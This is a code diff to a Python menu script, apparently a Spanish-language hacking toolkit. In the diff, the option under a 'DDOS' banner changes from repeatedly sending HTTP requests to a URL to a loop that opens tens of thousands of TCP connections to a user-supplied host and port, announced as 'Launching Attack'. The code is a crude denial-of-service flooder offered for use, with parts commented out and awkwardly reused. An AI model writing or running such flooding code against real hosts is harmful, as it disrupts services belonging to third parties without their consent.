@@ -363,7 +363,7 @@ elif choice == 11:
    
 elif choice == 12:
     os.system("clear")
-    RR = "\033[36;m"
+    RR = "\033[29;m"
     def a(s):
             for c in s + '\n':
                     sys.stdout.write(c)
@@ -374,21 +374,47 @@ elif choice == 12:
     a(RR+"█▀▀▄ █▀▀▄ █▀▀█ █▀▀▀█")
     a(RR+"█░▒█ █░▒█ █░░█ ▀▀▀▄▄")
     a(RR+"█▄▄▀ █▄▄▀ ▀▀▀▀ █▄▄▄█ ")        
-    print ("\033[32;m")
+    time.sleep(2) 
     
-    url = input("URL de la  wep:")
+    print("\033[32;m")
+    ip = input("hostname o IP>>>")
+    port = input("Port>>>>")
     while True:
-        r = requests.get(url)
-        r.history
-        r.status_code
-        200
-        r.url
-        (url)
+        
+    
+        
+        size = ("30000")
+        ip = str(ip)
+        port = int(port)
+        pac = int("65536")
+        print("\033[32;m")
+        print('[*] Launching Attack ...')
+        
+        addr = ((ip,port))
+        socks = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
         try:
-         print("[+]Peticion mandada a ", (url))
-        except:
-            print("[-]ERROR")
-  
+            socks.connect_ex(addr)
+            connected = 1
+        except socket.error:
+            connected = 0
+            print('Hostname could not be resolved')
+        i = 0
+        
+        #data = hashlib.sha512(size).hexdigest()
+        errors = 0
+        a = 0
+        while i < pac:
+            i+=1
+            try:
+                socks.settimeout(0.03)
+                socks.connect_ex(addr)
+                #socks.send(data)
+                print((a), '>>conectado>>', ip, 'en el purto', (port))
+                a = a+1
+            except socket.error:
+                print('[#]Conection Error')
+                errors = errors + 1  
+    
    
 elif choice == 13:
    
